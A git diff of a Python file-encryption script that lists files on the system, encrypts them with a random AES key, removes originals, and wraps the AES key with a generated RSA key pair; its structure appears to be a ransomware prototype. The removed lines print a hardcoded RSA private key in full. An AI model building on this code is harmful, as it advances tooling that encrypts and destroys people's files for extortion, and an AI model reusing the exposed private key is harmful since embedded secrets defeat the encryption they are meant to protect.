@@ -4,48 +4,18 @@ from Crypto.PublicKey import RSA
 from Crypto.Hash import SHA256
 import os, sys, struct
 import argparse
+import secrets
+
 
 if sys.version_info >= (3, 8, 0):
         import time
         time.clock = time.process_time
 
-
-SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAklmKLXGK6jfMis4ifjlB
-xSGMFCj1RtSA/sQxs4I5IWvMxYSD1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXT
-qPYmZW+TQjtrx4tG7ZHda65+EdyVJkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdP
-GhYcIZmJ7iT5aRCkXiKXrw+iIL6DT0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4re
-q/CydAWrsAJPhtEmObu6cn2FYFfwGmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkz
-vvYVc85DbQFK/Jcpeq0QkKiJ4Z+TWGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZg
-HwIDAQAB
------END PUBLIC KEY-----''' 
-SERVER_PRIVATE_RSA_KEY = '''-----BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEAklmKLXGK6jfMis4ifjlBxSGMFCj1RtSA/sQxs4I5IWvMxYSD
-1rZc+f3c67DJ6M8aajHxZTidXm+KEGk2LGXTqPYmZW+TQjtrx4tG7ZHda65+EdyV
-Jkwp7hD2fpYJhhn99Cu0J3A+EiNdt7+EtOdPGhYcIZmJ7iT5aRCkXiKXrw+iIL6D
-T0oiXNX7O7CYID8CykTf5/8Ee1hjAEv3M4req/CydAWrsAJPhtEmObu6cn2FYFfw
-GmBrUQf1BE0/4/uqCoP2EmCua6xJE1E2MZkzvvYVc85DbQFK/Jcpeq0QkKiJ4Z+T
-WGnjIZqBZDaVcmaDl3CKdrvY222bp/F20LZgHwIDAQABAoIBAFLE80IaSi+HGVaT
-mKx8o3bjLz8jnvzNKJttyJI2nysItcor1Qh1IQZ+Dhj6ZmcV4mGXF2hg6ZfES3hW
-mL3pZRjVBgguX0GBK8ayPY4VBf5ltIVTlMMRJlGvJEmZf49pWdhjc0Mu1twZRmKq
-nVpWy8T8JjLWjEy0ep5yPBPFSrZFphQdiZxTrnmNR/Ip48XXGnQtRuNGSsNattc/
-2UYmLjSYTPasSV7PeXtGGaw34dfiKKlh4anXzjl1ARcVEgDRG617y8eK3aGDpU5G
-5bm/M4kZ7xXVtrPuAlhcZPgPrPG2VH9/DTc1IzEXG65pAwC+WhCZv3xFRTYTz9ca
-qj4sYKkCgYEA+eBkkFb7K/t3JfE9AGwNBdmXepdgVOiBbKBxwXl4XbjTQn1BGCsQ
-0FmgaFUhL3SmDYvNuNnF1kFeXOlghMR4v1DOSttcrqEU0oztLDdY1PKxHBusp2oy
-RvK+JPZVMt8yRQkPWjVlSKWWgqO+Yd5QONWMKAfA1f3zCa1Rj/1ouwMCgYEAle+r
-QDIWri6e/mdim/ec/irpCRBn/2XTK1J0kqog1vmovIhhxHlTw7bb/S168afYY8v8
-TUJgKgnqGYmo/RVreMs+IZoN8ZoqkKBRRC00C/EpiDSv4q8EfHgzAP3Jpfk29brc
-QxEkClaXssRG/N8bK2aiUgztM4HabFSocWW5DbUCgYAcMQbnigi4g5yDuV3qiEZH
-3K7Mc/u4WKsReGCdNXkxCcM8Aymu8lzpRNNmMgSWeBCsApPpQRii/akJzoLHN+tv
-mkxMAcfJI/9XafLwRCZPkDoPM8gc80xM2OI/BVPDc48WXtlOkiulMJl0j8jQ/eYL
-I3y2n3lQK2CaPOWw2yRPxQKBgHcpshslM+1fVDGxDSgUFYvTor33chADZ19I+ykN
-WWhBp5+fbMRwAOjNTe3b1Zh14379QhpNJIyEsK93Pv1VpsKsFUczXt2jvyyOncfn
-fTP4iR+dcCRjINej2DVzfm4QsWN/DUuoNdKZm5sSb7DNyJQnz94SM/r5uxTZ+72U
-MQz5AoGBAK/R9Fx7UBmHcC+9ehBJ5aPzvU8DqiVYg2wAYGu/n81s30VdtTQwfSed
-14roox6zaAk8fEZ/nkS86evh6PqjfhSuniBoqvQllAPZTXdOm8KPchNU8VC+iSzw
-+IbSWacaVjzrtfY/UcRkUrgQotk8a4kPZrijPogn060VnXPEeq3t
------END RSA PRIVATE KEY-----'''
+class class_keys:
+  def __init__(self, AESkey, PUBLIC_RSAKEY, PRIVATE_RSAKEY):
+    self.AESkey = AESkey
+    self.PUBLIC_RSAKEY = PUBLIC_RSAKEY
+    self.PRIVATE_RSAKEY = PRIVATE_RSAKEY
 
 """
 def parse_args():
@@ -60,6 +30,18 @@ def parse_args():
 
     return parser.parse_args()
 """
+
+#Initialize both AES and RSA keys and store in class_keys
+def initialize_keys():
+    AESkey = secrets.token_bytes(32)
+
+    RSAkey = RSA.generate(2048)
+    publickey = RSAkey.publickey().exportKey("PEM")
+    privatekey = RSAkey.exportKey("PEM")
+
+    keys = class_keys(AESkey,publickey,privatekey)
+    return keys
+
 
 # Encrypt KEY (AES) with public key.
 def encrypt_key(AESkey, key):
@@ -173,32 +155,28 @@ def decrypt_file(l_files, key):
         os.remove(file_name)
 
         
-# hash pasword to get 16 bytes key.
-def getKey(password):
-    hasher = SHA256.new(password.encode())
-    return hasher.digest()
-
-
-def main():   
-    option = int(sys.argv[1])
+def main(): 
+    option = int(sys.argv[1]) 
     l_files = list_files(option)
+    keys = initialize_keys()
 
     if option == 1:
-        password = input("Enter the password >>> ")
-        encrypt_file(l_files, getKey(password))
+        #Encrypt files of your system
+        encrypt_file(l_files, keys.AESkey)
 
     elif option == 2:
-        password = input("Enter the password >>> ")
-        decrypt_file(l_files, getKey(password))
+        #Decrypt the encrypted files of your system
+        decrypt_file(l_files, keys.AESkey)
 
     elif option == 3:
-        password = input("Enter the password >>> ")
-        res = encrypt_key(getKey(password), SERVER_PUBLIC_RSA_KEY)
-        res = decrypt_key(res, SERVER_PRIVATE_RSA_KEY)
+        #Validate that encrypt and decrypt keys is working
+        enc = encrypt_key(keys.AESkey, keys.PUBLIC_RSAKEY)
+        dec = decrypt_key(enc, keys.PRIVATE_RSAKEY)
+        print(dec==keys.AESkey)
 
     else:
         print("No option selected")   
-   
+
 
 if __name__ == "__main__":
     main()
